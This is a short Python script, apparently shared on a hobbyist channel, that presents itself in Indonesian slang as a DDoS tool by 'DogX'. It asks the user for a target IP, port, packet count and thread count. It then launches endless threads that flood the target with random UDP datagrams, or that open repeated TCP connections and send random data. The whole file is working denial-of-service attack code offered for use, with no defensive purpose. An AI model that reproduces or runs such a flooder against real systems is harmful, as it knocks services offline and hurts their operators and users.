#!/usr/bin/env python3
#Kagak Usah Rename BY By DogX 
#Ddos by DogX | SUBSCRIBE TOD CHANNEL Dogx
import random
import socket
import threading
import os

os.system("clear")
print("DDoS Tools By DogX")
print("Kalo Tembus Jangan Abuse Kontol")
ip = str(input(" Ip: "))
port = int(input(" Port: "))
choice = str(input(" Mari Kirim Paket?!!(y/n): "))
times = int(input(" Paket Yang Mau Lu kirim: "))
threads = int(input(" Theards: "))
def run():
  data = random._urandom(1024)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print(i +" | Send!!!|")
    except:
      print("[!] | Send!!! |")

def run2():
  data = random._urandom(16)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
      print(i +" MANTAP KAWAN!!!")
    except:
      s.close()
      print("[*] Down")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = run)
    th.start()
  else:
    th = threading.Thread(target = run2)
    th.start()